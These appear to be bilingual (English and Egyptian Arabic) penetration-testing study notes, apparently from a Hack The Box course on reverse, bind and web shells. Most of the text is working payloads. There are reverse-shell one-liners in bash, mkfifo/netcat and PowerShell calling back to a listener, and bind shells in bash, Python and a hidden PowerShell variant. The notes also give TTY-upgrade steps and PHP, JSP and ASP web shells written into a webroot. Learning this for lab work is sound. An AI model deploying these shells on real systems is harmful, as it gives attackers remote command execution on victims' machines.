| Type of Shell   | Method of Communication                                                                                                     |
| --------------- | --------------------------------------------------------------------------------------------------------------------------- |
| `Reverse Shell` | Connects back to our system and gives us control through a reverse connection.                                              |
| `Bind Shell`    | Waits for us to connect to it and gives us control once we do.                                                              |
| `Web Shell`     | Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output. |
## Reverse Shell
A `Reverse Shell` is the most common type of shell, we can start a `netcat` listener on our machine that listens on a specific port, say port `1234`. With this listener in place, we can execute a `reverse shell command` that connects the remote systems shell, i.e., `Bash` or `PowerShell` to our `netcat` listener, which gives us a reverse connection over the remote system
- انا كا هاكر بفتح عندي بورت معين زي مثلا 1234 ولما ببعت الاسكريبت للvictim بكون انا عامل انه يتصل بالport ده فا لما الضحيه يشغل الملف بيبدأ علاطول يتصل بالبورت اللي انا فاتحه اللي هو 1234 ويفتح شيل بيني وبين الضحيه
#### Netcat Listener

The first step is to start a `netcat` listener on a port of our choosing:

```
htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
```

| Flag      | Description                                                                         |
| --------- | ----------------------------------------------------------------------------------- |
| `-l`      | Listen mode, to wait for a connection to connect to us.                             |
| `-v`      | Verbose mode, so that we know when we receive a connection.                         |
| `-n`      | Disable DNS resolution and only connect from/to IPs, to speed up the connection.    |
| `-p 1234` | Port number `netcat` is listening on, and the reverse connection should be sent to. |
دلوقتي ال`netcat` مستنيه الاتصال يجيلها علي البورت اللي انا فاتحه
- خلي بالك لازم فالاسكريبت اللي هيفتحلي الشيل احطله الip بتاع جهازي اللي هيكونكت بيه من جهاز الضحيه فا بعرف الip بتاعي منين؟
من خلال امر `ip a` 
![](Pasted%20image%2020250915215338.png)
#### Reverse Shell Command
- طيب الcommand نفسه اللي ببعته للضحيه بيكون عامل ازاي
حاجه زي كده مثلا
Code: bash
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

Code: bash

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

Code: powershell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```
after the victim open the malicious file netcat look like this
```
htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
A `Reverse Shell` is handy when we want to get a quick, reliable connection to our compromised host. However, a `Reverse Shell` can be very fragile. Once the reverse shell command is stopped, or if we lose our connection for any reason, we would have to use the initial exploit to execute the reverse shell command again to regain our access [Reverse Shell Generator](https://www.revshells.com/)

----
## Bind Shell
- الbind shell بقي عكس الreverse انا ببعت malicious script للvictim بفتح فيه بورت معين انا بحددو وانا دوري كا hacker اتصل بالبورت ده
Code: bash

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Code: python

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

Code: powershell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```
بص انا هنا بقولو افتحلي بورت `1234`
- فا انا هروح للnc واتصل بالبورت ده
#### Netcat Connection

Once we execute the bind shell command, we should have a shell waiting for us on the specified port. We can now connect to it.
We can use `netcat` to connect to that port and get a connection to the shell:

```shell-session
htb[/htb]$ nc 10.10.10.1 1234
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---
### 📝 Upgrading TTY Notes

- بعد ما توصل بـ **Netcat** بيكون الـ shell محدود (مفيش history أو أسهم).
- لازم تعمله upgrade لــ TTY كامل.
#### تشغيل bash داخل TTY

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### إيقاف الجلسة مؤقتًا
- اضغط `Ctrl + Z` عشان ترجع للترمينال المحلي.
#### تعديل إعدادات الطرفية المحلية

```bash
stty raw -echo
```
#### إرجاع الجلسة للخلفية

```bash
fg
```

- اضغط Enter مرتين لو الشاشة سودة.
#### ضبط إعدادات الطرفية داخل السيرفر

- في ترمينال محلي تاني:
    ```bash
    echo $TERM        # نوع الطرفية (غالبًا xterm-256color)
    stty size         # عدد الصفوف والأعمدة
    ```
- في الـ shell البعيد:
    ```bash
    export TERM=xterm-256color
    stty rows 67 columns 318
    ```
    
---
## Web Shell
- The final type of shell we have is a `Web Shell`. A `Web Shell` is typically a web script, i.e., `PHP` or `ASPX`, that accepts our command through HTTP request parameters such as `GET` or `POST` request parameters, executes our command, and prints its output back on the web page
- الweb shell من اسمه معروف هنا الويب ممكن انه ينفذ اوامر وده بيتم من خلال اني برفعلو malicious script برضو 
#### Writing a Web Shell
Code: php

```php
<?php system($_REQUEST["cmd"]); ?>
```

Code: jsp

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

Code: asp

```asp
<% eval request("cmd") %>
```
#### Uploading a Web Shell
- This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. `shell.php` and upload it, and then access our uploaded file to execute commands

| Web Server | Default Webroot        |
| ---------- | ---------------------- |
| `Apache`   | /var/www/html/         |
| `Nginx`    | /usr/local/nginx/html/ |
| `IIS`      | c:\inetpub\wwwroot\    |
| `XAMPP`    | C:\xampp\htdocs\       |
We can check these directories to see which webroot is in use and then use `echo` to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a `PHP` shell with the following command:

Code: bash

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```
بعد ما تحط web shell (مثلاً `shell.php`) في الـ webroot:

- تقدر توصله من المتصفح:

    `http://SERVER_IP:PORT/shell.php?cmd=id`
    ➜ يشغّل أمر `id` ويرجع النتيجة.
- أو تستخدم **cURL** من الترمنال:
    `curl http://SERVER_IP:PORT/shell.php?cmd=id`
----
